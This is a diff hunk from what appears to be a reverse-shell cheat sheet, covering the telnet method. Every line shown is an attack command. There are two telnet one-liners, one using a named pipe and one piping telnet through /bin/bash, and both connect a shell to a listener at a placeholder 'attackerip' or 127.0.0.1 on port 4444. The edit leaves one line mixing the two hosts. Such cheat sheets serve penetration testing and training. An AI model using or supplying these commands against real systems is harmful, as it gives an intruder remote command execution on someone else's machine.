@@ -42,8 +42,8 @@ This is a pretty obscure / esoteric method but there might be a chance you might
     
 ### 7. Telnet
 
-     rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+     rm -f /tmp/p; mknod /tmp/p p && telnet 127.0.0.1 4444 0/tmp/p
      
 Or use a bunch of piping
      
-    telnet attackerip 4444 | /bin/bash | telnet attackerip 4444   
+    telnet attackerip 4444 | /bin/bash | telnet 127.0.0.1 4444   
